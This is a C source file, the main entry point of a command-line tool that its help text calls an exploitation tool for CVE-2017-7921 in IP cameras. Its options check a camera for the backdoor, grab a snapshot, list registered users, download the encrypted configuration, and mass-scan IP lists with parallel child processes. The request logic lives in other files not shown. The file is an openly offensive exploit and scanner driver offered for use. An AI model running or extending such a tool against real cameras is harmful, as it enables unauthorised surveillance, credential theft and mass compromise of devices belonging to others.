#include "hikreset.h"
#include "scanner.h"
#include <stdio.h>
#include <stdlib.h>
#include <getopt.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>


void print_help(char *filename){
	printf("%s - CVE-2017-7921 exploitation tool\n"
		"Common usage:\n"
		"%s <options> <ip>\n"
		"Options:\n"
		"-h/--help - this help message\n"
		"-s/--snapshot <filename> - get snapshot from camera and write it into <filename>\n"
		"-c/--check - just check camera for CVE\n"
		"-g/--getusers - print users registred on camera\n"
		"-C/--getconfig <filename> - get encrypted camera config and write it into <filename>\n"
		"-S/--scan <filename> <childs maximum> - scan IPs from <filename> for CVE\n",
		filename, filename
		);
}

void print_usage(char *filename){
	printf("Usage: %s [options] <ip>\n", filename);
	exit(-1);
}

int main(int argc, char **argv)
{
	int opchar = 0;
	struct option long_options[] = {
		{"help",        no_argument,       NULL, 'h'},
		{"snapshot",     required_argument,       NULL, 's'},
		{"check",      no_argument,       NULL, 'c'},
		{"getusers",      no_argument,       NULL, 'g'},
		{"getconfig",      required_argument,       NULL, 'C'},
		{"scan",      required_argument,       NULL, 'S'},
		{NULL, 0, NULL, 0}
	};
	while(-1!=(opchar = getopt_long(argc, argv, "hs:cgC:S:", long_options, NULL))){
		switch(opchar){
			case 'S': {
				if(!access(optarg, R_OK)){
					FILE *fd;
					fd = fopen(optarg, "rt");
					if (argc>=4) scan(fd, atoi(argv[3]));
					else print_help(argv[0]);
				}else
					fprintf(stderr, "Have no access to file %s : %s\n", optarg,strerror(errno));
				break;
			}
			case 's': {
				FILE *fd;
				fd = fopen(optarg, "wb");
				download(argv[3], SNAPSHOT, fd);
				break;
			}
			case 'h': {
				print_help(argv[0]);
				break;
			}
			case 'C': {
				FILE *fd;
				fd = fopen(optarg, "wb");
				download(argv[3], CONFIG, fd);
				break;
			}
			case 'c': {
				long checked = backdoorCheck(argv[2]);
				if (checked == 1){
					printf("%s - Backdoor Confirmed!\n", argv[2]);
					return 0;
				}
				else if (checked == -3){
					printf("Something went wrong during curl init.\n");
					return 1;
				}
				else{
					printf("%s - Backdoor not confirmed.\n", argv[2]);
					return 2;
				}
				break;
			}
			case 'g':{
				getUsers(argv[2]);
				break;
			}
			default:{
				print_usage(argv[0]);
				break;
			}
		}
		
		return 1;

	}
	print_usage(argv[0]);
}